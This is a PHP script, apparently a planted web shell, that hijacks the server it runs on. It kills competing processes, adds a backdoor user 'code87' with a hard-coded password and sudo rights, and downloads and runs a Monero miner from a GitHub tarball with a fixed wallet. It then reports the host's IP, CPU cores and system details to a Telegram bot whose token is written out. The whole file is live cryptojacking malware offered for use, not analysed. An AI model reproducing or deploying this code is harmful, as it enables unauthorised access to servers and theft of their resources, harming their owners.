<?php
echo '<center><h1>PASUKAN BERANI MATI</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] ';
exec("ps -ef|awk '/upgrade|update|xmrig|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9");
if(in_array  ('curl', get_loaded_extensions())){
	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; curl -o sysls.tar.gz https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass '.php_uname('n').' --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
} else {
	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass '.php_uname('n').' --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
}
$sys = php_uname();
$lihat = system('curl ipecho.net/plain');
$corenya = system('nproc');
$apiToken = "1862821332:AAHp1nTa72MEM9vHkL7-lAW-OgWp8U_p7MA";
$data = [ 'chat_id' => '-562021285', 'text' => "Miner : 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY\r\n IP : $lihat   \r\n Core : $corenya \r\n Uname : \r\n $sys \r\n " ];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
